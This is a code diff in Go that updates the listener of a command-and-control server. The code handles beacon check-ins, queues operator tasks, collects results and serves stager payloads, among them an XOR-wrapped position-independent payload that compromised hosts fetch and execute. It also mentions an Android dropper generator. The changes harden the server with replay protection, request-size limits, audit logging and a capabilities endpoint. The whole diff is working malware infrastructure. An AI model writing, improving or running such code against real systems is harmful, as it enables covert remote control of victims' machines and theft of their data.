@@ -29,6 +29,11 @@ import (
 const (
 	maxResultOutputBytes = 10 * 1024 * 1024
 	maxRequestBody       = 50 * 1024 * 1024
+	// B-3: the per-beacon HMAC signs the BODY, so the body must be read
+	// before authorize() can run. Cap that pre-auth read tightly instead of
+	// letting an unauthenticated peer make the listener buffer 50 MiB.
+	maxCheckinBody = 256 * 1024
+	maxResultBody  = 12 * 1024 * 1024
 )
 
 // payloadFiles maps a download path to the file served from the beacon dir.
@@ -70,25 +75,35 @@ type Server struct {
 
 // NewServer builds a listener over the given store.
 func NewServer(cfg *Config, store *Store, logger *log.Logger) *Server {
-	return &Server{cfg: cfg, store: store, guard: NewReplayGuard(), logger: logger}
+	return &Server{
+		cfg:    cfg,
+		store:  store,
+		guard:  NewReplayGuardAt(filepath.Join(cfg.DataDir, "c2_replay.json")),
+		logger: logger,
+	}
 }
 
 // Handler returns the routed, wrapped HTTP handler.
 func (s *Server) Handler() http.Handler {
 	mux := http.NewServeMux()
-	mux.HandleFunc("GET /api/v1/ping", s.beacon(s.handleCheckin))
-	mux.HandleFunc("POST /api/v1/ping", s.beacon(s.handleCheckin))
-	mux.HandleFunc("POST /api/v1/result", s.beacon(s.handleResult))
+	mux.HandleFunc("GET /api/v1/ping", s.beacon(maxCheckinBody, s.handleCheckin))
+	mux.HandleFunc("POST /api/v1/ping", s.beacon(maxCheckinBody, s.handleCheckin))
+	mux.HandleFunc("POST /api/v1/result", s.beacon(maxResultBody, s.handleResult))
 	mux.HandleFunc("GET /api/v1/beacons", s.operator(s.handleBeacons))
 	mux.HandleFunc("POST /api/v1/queue", s.operator(s.handleQueue))
 	mux.HandleFunc("GET /api/v1/results", s.operator(s.handleResults))
+	// C-3: advertise what this data plane actually implements, so an operator
+	// (and `doctor`) can see the boundary instead of discovering it from a
+	// 501 mid-engagement.
+	mux.HandleFunc("GET /api/v1/capabilities", s.operator(s.handleCapabilities))
 	for path := range payloadFiles {
 		p := path
 		mux.HandleFunc("GET "+p, s.transferToken(s.handlePayload(p)))
 	}
-	// /x (PIC) and /s/android (stager) carry generation logic that stays in
-	// the Python control plane; answer honestly instead of 404-ing silently.
-	mux.HandleFunc("GET /x", s.transferToken(s.handleNotPorted))
+	// /x (PIC) is a plain file fetch, ported here (C-3). /s/android needs the
+	// Python dropper generator and stays in the control plane: answer
+	// honestly instead of 404-ing silently.
+	mux.HandleFunc("GET /x", s.transferToken(s.handlePIC))
 	mux.HandleFunc("GET /s/android", s.transferToken(s.handleNotPorted))
 	// The root and the malleable catch-all. {$} matches ONLY "/".
 	mux.HandleFunc("GET /{$}", func(w http.ResponseWriter, r *http.Request) {
@@ -103,17 +118,18 @@ func (s *Server) Handler() http.Handler {
 
 type beaconHandler func(http.ResponseWriter, *http.Request, string)
 
-func (s *Server) beacon(next beaconHandler) http.HandlerFunc {
+func (s *Server) beacon(maxBytes int64, next beaconHandler) http.HandlerFunc {
 	return func(w http.ResponseWriter, r *http.Request) {
 		beaconID := r.Header.Get("X-Beacon-Id")
 		if beaconID == "" {
 			http.Error(w, "missing beacon id", http.StatusBadRequest)
 			return
 		}
-		body := readBody(w, r)
+		body := readBody(w, r, maxBytes)
 		if !s.authorize(r, beaconID, body) {
 			s.logger.Printf("unauthenticated request rejected for %s from %s",
 				beaconID, r.RemoteAddr)
+			s.store.audit("beacon_auth_failed", map[string]any{"beacon_id": beaconID})
 			http.Error(w, "Unauthorized", http.StatusUnauthorized)
 			return
 		}
@@ -262,7 +278,10 @@ func (s *Server) handleCheckin(w http.ResponseWriter, r *http.Request, body stri
 			s.logger.Printf("telemetry decrypt failed for %s", beaconID)
 		}
 	}
+	existed := s.store.Registered(beaconID)
 	s.store.UpdateBeacon(beaconID, info)
+	s.store.audit("beacon_checkin", map[string]any{
+		"beacon_id": beaconID, "new": !existed, "ip": info["ip"]})
 
 	tasks := s.store.PendingTasks(beaconID)
 	payload, err := json.Marshal(map[string]any{"tasks": tasks})
@@ -286,6 +305,13 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request, body strin
 		http.Error(w, "Bad Request", http.StatusBadRequest)
 		return
 	}
+	s.storeDecodedResult(w, beaconID, dec)
+}
+
+// storeDecodedResult validates and stores an ALREADY-decrypted result. Split
+// out so the malleable catch-all (B-5) can route on a single decrypt instead
+// of decrypting twice and sniffing for the substring "task_id".
+func (s *Server) storeDecodedResult(w http.ResponseWriter, beaconID, dec string) {
 	var data struct {
 		TaskID string `json:"task_id"`
 		Output string `json:"output"`
@@ -307,6 +333,9 @@ func (s *Server) handleResult(w http.ResponseWriter, r *http.Request, body strin
 		return
 	}
 	s.store.AddResult(beaconID, data.TaskID, data.Output)
+	s.store.audit("result_stored", map[string]any{
+		"beacon_id": beaconID, "task_id": data.TaskID,
+		"bytes": len(data.Output)})
 	io.WriteString(w, "OK")
 }
 
@@ -332,16 +361,39 @@ func (s *Server) handleQueue(w http.ResponseWriter, r *http.Request) {
 		writeJSON(w, http.StatusBadRequest, map[string]any{"error": err.Error()})
 		return
 	}
+	s.store.audit("task_queued", map[string]any{
+		"beacon_id": body.BeaconID, "bytes": len(body.Command)})
 	writeJSON(w, http.StatusOK, map[string]any{"status": "queued"})
 }
 
 func (s *Server) handleResults(w http.ResponseWriter, r *http.Request) {
 	beaconID := r.URL.Query().Get("beacon_id")
 	if beaconID == "" {
-		writeJSON(w, http.StatusOK, map[string]any{"error": "beacon_id required"})
+		// B-4: a malformed request is a 400, not a 200 with an error body.
+		writeJSON(w, http.StatusBadRequest, map[string]any{
+			"error": "beacon_id required"})
 		return
 	}
 	writeJSON(w, http.StatusOK, map[string]any{"results": s.store.Results(beaconID)})
+}
+
+// handleCapabilities reports the boundary between this Go data plane and the
+// Python control plane (C-3/D-2). Anything false here is served by the Python
+// listener and answered with 501 on this surface.
+func (s *Server) handleCapabilities(w http.ResponseWriter, _ *http.Request) {
+	writeJSON(w, http.StatusOK, map[string]any{
+		"data_plane":     "c2d",
+		"wire_protocol":  "v1",
+		"checkin":        true,
+		"results":        true,
+		"payloads":       true,
+		"replay_persist": true,
+		"audit_log":      s.store.auditEnabled(),
+		"task_policy":    false, // D-2: capability/grant policy stays in Python
+		"stager_pic":     true,  // C-3: /x is served from PayloadDir here
+		"stager_android": false, // C-3: /s/android needs the Python generator
+		"operator_api":   true,
+	})
 }
 
 func (s *Server) handlePayload(path string) http.HandlerFunc {
@@ -364,6 +416,26 @@ func (s *Server) handlePayload(path string) http.HandlerFunc {
 		w.Header().Set("Content-Type", "application/octet-stream")
 		http.ServeContent(w, r, file, info.ModTime(), f)
 	}
+}
+
+// handlePIC serves the XOR-wrapped PIC payload on /x, byte-identical to what
+// the Python listener serves. It is NOT a browser download, so there is no
+// Content-Disposition: the persistence/stager path fetches and executes it.
+func (s *Server) handlePIC(w http.ResponseWriter, r *http.Request) {
+	full := filepath.Join(s.cfg.PayloadDir, "beacon_xored.bin")
+	f, err := os.Open(full)
+	if err != nil {
+		http.Error(w, "payload not built", http.StatusNotFound)
+		return
+	}
+	defer f.Close()
+	info, err := f.Stat()
+	if err != nil || info.IsDir() {
+		http.Error(w, "payload not built", http.StatusNotFound)
+		return
+	}
+	w.Header().Set("Content-Type", "application/octet-stream")
+	http.ServeContent(w, r, "beacon_xored.bin", info.ModTime(), f)
 }
 
 func (s *Server) handleNotPorted(w http.ResponseWriter, _ *http.Request) {
@@ -392,16 +464,25 @@ func (s *Server) handleCatchAll(w http.ResponseWriter, r *http.Request) {
 		s.handleCheckin(w, r, "")
 		return
 	}
-	body := readBody(w, r)
+	body := readBody(w, r, maxResultBody)
 	if !s.authorize(r, beaconID, body) {
+		s.store.audit("beacon_auth_failed", map[string]any{"beacon_id": beaconID})
 		http.Error(w, "Unauthorized", http.StatusUnauthorized)
 		return
 	}
+	// B-5: decrypt ONCE and route on a real JSON field, not on the
+	// substring "task_id" (which a beacon's OUTPUT could contain, or which a
+	// different JSON shape could fake).
 	if body != "" {
-		if dec, err := s.decryptFor(beaconID, body); err == nil &&
-			strings.Contains(dec, "task_id") {
-			s.handleResult(w, r, body)
-			return
+		if dec, err := s.decryptFor(beaconID, body); err == nil {
+			var probe struct {
+				TaskID *string `json:"task_id"`
+			}
+			if json.Unmarshal([]byte(dec), &probe) == nil &&
+				probe.TaskID != nil && *probe.TaskID != "" {
+				s.storeDecodedResult(w, beaconID, dec)
+				return
+			}
 		}
 	}
 	s.handleCheckin(w, r, body)
@@ -454,11 +535,15 @@ func (s *Server) TLSConfig() (*tls.Config, error) {
 
 // ── helpers ────────────────────────────────────────────────────────────
 
-func readBody(w http.ResponseWriter, r *http.Request) string {
+// readBody reads at most limit bytes. It uses http.MaxBytesReader (not just
+// io.LimitReader) so an over-sized body is cut off at the socket and the
+// connection is closed instead of being silently truncated.
+func readBody(w http.ResponseWriter, r *http.Request, limit int64) string {
 	if r.Body == nil {
 		return ""
 	}
-	raw, _ := io.ReadAll(io.LimitReader(r.Body, maxRequestBody))
+	r.Body = http.MaxBytesReader(w, r.Body, limit)
+	raw, _ := io.ReadAll(r.Body)
 	return string(raw)
 }
 
@@ -511,7 +596,11 @@ func applyTelemetry(info map[string]any, payload string) {
 	var ips []string
 	for _, line := range strings.Split(netinfo, "\n") {
 		if idx := strings.Index(line, "IP: "); idx >= 0 {
-			ips = append(ips, strings.Fields(line[idx+4:])[0])
+			// A-5: a bare "IP: " line made strings.Fields(...) empty and
+			// [0] panic the whole handler (a remote DoS from a beacon).
+			if fields := strings.Fields(line[idx+4:]); len(fields) > 0 {
+				ips = append(ips, fields[0])
+			}
 		} else if idx := strings.Index(line, "IP (v4): "); idx >= 0 {
 			ips = append(ips, strings.TrimSpace(line[idx+9:]))
 		}
